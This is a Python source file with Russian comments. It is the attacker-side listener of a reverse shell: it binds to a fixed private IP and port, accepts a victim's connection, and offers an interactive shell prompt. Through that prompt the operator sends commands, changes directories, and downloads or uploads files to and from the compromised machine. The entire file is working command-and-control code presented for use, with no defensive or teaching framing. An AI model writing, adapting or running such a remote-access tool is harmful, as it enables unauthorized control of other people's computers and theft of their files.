#!/usr/bin/python
import socket 
import json
import base64
import logging

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

#конвектирует данные пайтона в джейсон а его в свою очередь в байты
def reliable_send(data, target):
        json_data = json.dumps(data).encode()
        target.send(json_data)

#принимает большие данные по частям
def reliable_recv(target):
        json_data = b""
        while True:
                try:
                        json_data = json_data + target.recv(1024)
                        return json.loads(json_data.decode())
                except ValueError:
                        continue

# Загрузка файла от клиента
def download_file(command, target):
    file_name = command[9:]
    try:
        with open(file_name, "wb") as file:
            file_data = reliable_recv(target)
            file.write(base64.b64decode(file_data))
            logging.info(f"Файл {file_name} успешно загружен")
    except Exception as e:
        logging.error(f"Ошибка загрузки файла {file_name}: {e}")

def upload_file(command, target):
    file_name = command[7:]
    try:
        with open(file_name, "rb") as file:
            reliable_send(base64.b64encode(file.read()).decode(), target)
            logging.info(f"Файл {file_name} успешно отправлен")
    except FileNotFoundError:
        logging.error(f"Файл {file_name} не найден")
        reliable_send("[!!] Файл не найден", target)

# Работа с удаленной оболочкой
def shell(target, ip):
    while True:
        try:
            command = input(f"*Shell#~{ip}: ")
            reliable_send(command, target)
            if command == "q":
                break
            elif command.startswith("cd") and len(command) > 1:
                response = reliable_recv(target)
                print(response)
            elif command.startswith("download"):
                download_file(command, target)
            elif command.startswith("upload"):
                upload_file(command, target)
            else:
                response = reliable_recv(target)
                print(response)
        except Exception as e:
            logging.error(f"Ошибка выполнения команды: {e}")
            break

#подключение и прослушивание
def server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("192.168.178.67", 54321))
        s.listen(1)
        logging.info("[+] Ожидание подключения...")
        target, ip = s.accept()
        logging.info(f"[+] Подключение установлено с {ip}")
        shell(target, ip)

if __name__ == "__main__":
    try:
        server()
    except KeyboardInterrupt:
        logging.info("\n[!] Сервер остановлен вручную")
    except Exception as e:
        logging.error(f"[!!] Критическая ошибка: {e}")
